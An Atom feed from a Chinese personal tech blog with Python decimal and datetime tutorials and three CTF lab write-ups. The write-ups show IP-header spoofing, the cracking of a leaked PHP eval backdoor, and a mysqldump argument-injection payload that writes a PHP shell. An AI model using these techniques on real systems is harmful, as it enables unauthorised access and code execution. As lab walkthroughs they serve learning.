<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦的小屋</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-03-30T08:46:25.589Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>晨曦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>py decimal库</title>
    <link href="http://example.com/2025/03/30/python/py-decimal/"/>
    <id>http://example.com/2025/03/30/python/py-decimal/</id>
    <published>2025-03-30T16:45:50.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="decimal-库简介"><a href="#decimal-库简介" class="headerlink" title="decimal 库简介"></a>decimal 库简介</h2><p>decimal 是 Python 标准库中用于十进制浮点运算的模块，它提供了 Decimal 类来进行精确的十进制数学计算。与内置的 float 类型相比，Decimal 可以：</p><ul><li>精确控制精度</li><li>正确处理小数计算</li><li>消除浮点数计算中的精度误差</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="1-创建-Decimal-对象"><a href="#1-创建-Decimal-对象" class="headerlink" title="1. 创建 Decimal 对象"></a>1. 创建 Decimal 对象</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本创建方式</span></span><br><span class="line">d1 = Decimal(<span class="string">&#x27;0.1&#x27;</span>)</span><br><span class="line">d2 = Decimal(<span class="string">&#x27;0.2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d1 + d2 = <span class="subst">&#123;d1 + d2&#125;</span>&quot;</span>)  <span class="comment"># 输出：0.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对比 float</span></span><br><span class="line">f1 = <span class="number">0.1</span></span><br><span class="line">f2 = <span class="number">0.2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f1 + f2 = <span class="subst">&#123;f1 + f2&#125;</span>&quot;</span>)  <span class="comment"># 输出：0.30000000000000004</span></span><br></pre></td></tr></table></figure></div><h3 id="2-精度控制"><a href="#2-精度控制" class="headerlink" title="2. 精度控制"></a>2. 精度控制</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置全局精度</span></span><br><span class="line">getcontext().prec = <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># 输出：0.3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时改变精度</span></span><br><span class="line"><span class="keyword">with</span> localcontext() <span class="keyword">as</span> ctx:</span><br><span class="line">    ctx.prec = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># 输出：0.33</span></span><br></pre></td></tr></table></figure></div><h3 id="3-四舍五入"><a href="#3-四舍五入" class="headerlink" title="3. 四舍五入"></a>3. 四舍五入</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, ROUND_HALF_UP, ROUND_DOWN</span><br><span class="line"></span><br><span class="line">num = Decimal(<span class="string">&#x27;3.14159&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四舍五入到指定位数</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_HALF_UP))  <span class="comment"># 输出：3.14</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.1&#x27;</span>), ROUND_HALF_UP))   <span class="comment"># 输出：3.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向下取整</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_DOWN))     <span class="comment"># 输出：3.14</span></span><br></pre></td></tr></table></figure></div><h3 id="4-数学运算"><a href="#4-数学运算" class="headerlink" title="4. 数学运算"></a>4. 数学运算</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">a = Decimal(<span class="string">&#x27;1.5&#x27;</span>)</span><br><span class="line">b = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加法：<span class="subst">&#123;a + b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;减法：<span class="subst">&#123;a - b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;乘法：<span class="subst">&#123;a * b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;除法：<span class="subst">&#123;a / b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取整和余数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;向下取整：<span class="subst">&#123;a.floor()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;向上取整：<span class="subst">&#123;b.ceil()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;取余：<span class="subst">&#123;a % b&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="常用方法和属性"><a href="#常用方法和属性" class="headerlink" title="常用方法和属性"></a>常用方法和属性</h2><table><thead><tr><th>方法&#x2F;属性</th><th>说明</th></tr></thead><tbody><tr><td>as_tuple()</td><td>返回数值的元组表示</td></tr><tr><td>quantize()</td><td>设置小数位数</td></tr><tr><td>normalize()</td><td>规范化表示</td></tr><tr><td>is_finite()</td><td>检查是否为有限数</td></tr><tr><td>is_infinite()</td><td>检查是否为无穷大</td></tr><tr><td>is_nan()</td><td>检查是否为 NaN</td></tr></tbody></table><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>Decimal 对象之间可以进行算术运算，但不能直接与 float 类型混合运算</li><li>使用字符串初始化 Decimal 对象可以避免浮点数精度问题</li><li>设置全局精度会影响所有后续的计算</li><li>在金融计算等需要精确小数计算的场景中，应优先使用 Decimal</li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ol><li><p>金融计算</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">price = Decimal(<span class="string">&#x27;19.99&#x27;</span>)</span><br><span class="line">tax_rate = Decimal(<span class="string">&#x27;0.15&#x27;</span>)</span><br><span class="line">quantity = Decimal(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">total = price * quantity</span><br><span class="line">tax = total * tax_rate</span><br><span class="line">final_price = total + tax</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总价：<span class="subst">&#123;final_price&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li><li><p>科学计算</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">50</span>  <span class="comment"># 设置高精度</span></span><br><span class="line">pi = Decimal(<span class="string">&#x27;3.14159265358979323846264338327950288419716939937510&#x27;</span>)</span><br><span class="line">radius = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">area = pi * radius * radius</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;圆的面积：<span class="subst">&#123;area&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
    <category term="decimal" scheme="http://example.com/tags/decimal/"/>
    
  </entry>
  
  <entry>
    <title>py datetime库</title>
    <link href="http://example.com/2025/03/30/python/py-datetime/"/>
    <id>http://example.com/2025/03/30/python/py-datetime/</id>
    <published>2025-03-30T16:38:50.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="datetime-库简介"><a href="#datetime-库简介" class="headerlink" title="datetime 库简介"></a>datetime 库简介</h2><p>datetime 是 Python 内置的日期和时间处理库，提供了处理日期和时间的类和函数。主要包含以下常用类：</p><ul><li>datetime：同时包含日期和时间信息</li><li>date：仅包含日期信息</li><li>time：仅包含时间信息</li><li>timedelta：表示时间间隔</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="1-获取当前日期和时间"><a href="#1-获取当前日期和时间" class="headerlink" title="1. 获取当前日期和时间"></a>1. 获取当前日期和时间</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前日期和时间</span></span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当前时间：<span class="subst">&#123;now&#125;</span>&quot;</span>)  <span class="comment"># 输出格式如：2025-03-30 16:38:50.123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取年、月、日、时、分、秒</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;年：<span class="subst">&#123;now.year&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;月：<span class="subst">&#123;now.month&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;日：<span class="subst">&#123;now.day&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;时：<span class="subst">&#123;now.hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;分：<span class="subst">&#123;now.minute&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;秒：<span class="subst">&#123;now.second&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="2-日期格式化"><a href="#2-日期格式化" class="headerlink" title="2. 日期格式化"></a>2. 日期格式化</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将日期转换为字符串</span></span><br><span class="line">date_str = now.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;格式化日期：<span class="subst">&#123;date_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为日期</span></span><br><span class="line">date_obj = datetime.strptime(<span class="string">&quot;2025-03-30 16:38:50&quot;</span>, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解析的日期：<span class="subst">&#123;date_obj&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="3-日期计算"><a href="#3-日期计算" class="headerlink" title="3. 日期计算"></a>3. 日期计算</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 日期加减</span></span><br><span class="line">tomorrow = now + timedelta(days=<span class="number">1</span>)</span><br><span class="line">yesterday = now - timedelta(days=<span class="number">1</span>)</span><br><span class="line">next_hour = now + timedelta(hours=<span class="number">1</span>)</span><br><span class="line">last_week = now - timedelta(weeks=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;明天：<span class="subst">&#123;tomorrow&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;昨天：<span class="subst">&#123;yesterday&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;一小时后：<span class="subst">&#123;next_hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;上周：<span class="subst">&#123;last_week&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="4-时区处理"><a href="#4-时区处理" class="headerlink" title="4. 时区处理"></a>4. 时区处理</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pytz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建时区对象</span></span><br><span class="line">tz_utc = pytz.UTC</span><br><span class="line">tz_cn = pytz.timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时区的时间</span></span><br><span class="line">cn_time = datetime.now(tz_cn)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;中国时间：<span class="subst">&#123;cn_time&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时区转换</span></span><br><span class="line">utc_time = cn_time.astimezone(tz_utc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;UTC时间：<span class="subst">&#123;utc_time&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="常用格式化符号"><a href="#常用格式化符号" class="headerlink" title="常用格式化符号"></a>常用格式化符号</h2><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>%Y</td><td>年份（如：2025）</td></tr><tr><td>%m</td><td>月份（01-12）</td></tr><tr><td>%d</td><td>日期（01-31）</td></tr><tr><td>%H</td><td>24小时制（00-23）</td></tr><tr><td>%I</td><td>12小时制（01-12）</td></tr><tr><td>%M</td><td>分钟（00-59）</td></tr><tr><td>%S</td><td>秒（00-59）</td></tr><tr><td>%f</td><td>微秒（000000-999999）</td></tr><tr><td>%A</td><td>星期几的完整名称</td></tr><tr><td>%a</td><td>星期几的简写</td></tr><tr><td>%B</td><td>月份名称</td></tr><tr><td>%b</td><td>月份简写</td></tr></tbody></table><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>datetime 对象是不可变的（immutable）</li><li>进行时区操作时需要安装 pytz 库：<code>pip install pytz</code></li><li>在处理时区时，建议始终使用 aware datetime（包含时区信息的datetime对象）</li><li>在数据库操作中，建议统一使用 UTC 时间，展示时再转换为本地时间</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="datetime" scheme="http://example.com/tags/datetime/"/>
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2025/03/30/java/maven/maven%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2025/03/30/java/maven/maven%E9%85%8D%E7%BD%AE/</id>
    <published>2025-03-30T08:46:25.589Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有时间再补</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2025/03/30/java/servlet/servlet/"/>
    <id>http://example.com/2025/03/30/java/servlet/servlet/</id>
    <published>2025-03-30T08:46:25.589Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有时间再补</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>禁止访问</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/</id>
    <published>2025-03-29T22:38:43.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>抓个包</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 14:55:23 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 463</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;禁止访问&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>我们看到</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>用burp爆，后两位从1-255遍历</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">X-Forwarded-For: 192.168.§1§.§1§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></div><p>什么东西都没有（</p><p>又审了一遍<br>考虑用Client-IP</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Client-IP: 192.168.§1§.§1§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>这回爆出来了,tm的居然192.168.1.1</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 15:06:06 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 460</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;禁止访问&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">flag&#123;b0f38231-f0d4-4144-ad49-f82d4b684a76&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>遗留的压缩包</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/</id>
    <published>2025-03-29T22:34:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>题目中有压缩包，考虑到<a class="link"   href="http://www.zip/" >www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>访问<a class="link"   href="http://www.zip发现居然真的有/" >www.zip发现居然真的有 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>1337.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># leet</span><br><span class="line">if(md5($_GET[&#x27;pwd&#x27;])==&#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;)&#123;</span><br><span class="line">   eval($_POST[&#x27;1337&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>明显是md5碰撞<br>猜测pwd复杂度不高<br>戳个py脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def find_md5(target_hash, max_length=4):</span><br><span class="line">    chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">    </span><br><span class="line">    def calculate_md5(text):</span><br><span class="line">        return hashlib.md5(text.encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    for length in range(1, max_length + 1):</span><br><span class="line">        for guess in product(chars, repeat=length):</span><br><span class="line">            candidate = &#x27;&#x27;.join(guess)</span><br><span class="line">            if calculate_md5(candidate) == target_hash:</span><br><span class="line">                return candidate</span><br><span class="line">            </span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">target = &#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;</span><br><span class="line">result = find_md5(target)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div><p>爆出来leet<br>然后就是命令执行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="hash" scheme="http://example.com/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>dumpit</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/dumpit/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/dumpit/</id>
    <published>2025-03-27T17:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>扫了一遍，没东西.<br>题目是这个玩意</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>随便按照上面的提示进行输入</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>尝试sql发现没有注入<br>然后我不会了</p><p>查到<br>?db&#x3D;&amp;table_2_dump&#x3D; 估计调⽤的是 mysqldump 之类的命令, 存在命令注⼊<br>–result-file  filename可以用来指定生成文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=&quot;&lt;?=phpinfo()?&gt;&quot; --result-file shell.php&amp;table_2_dump=flag1</span><br></pre></td></tr></table></figure></div><p>在phpinfo里面找到flag即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
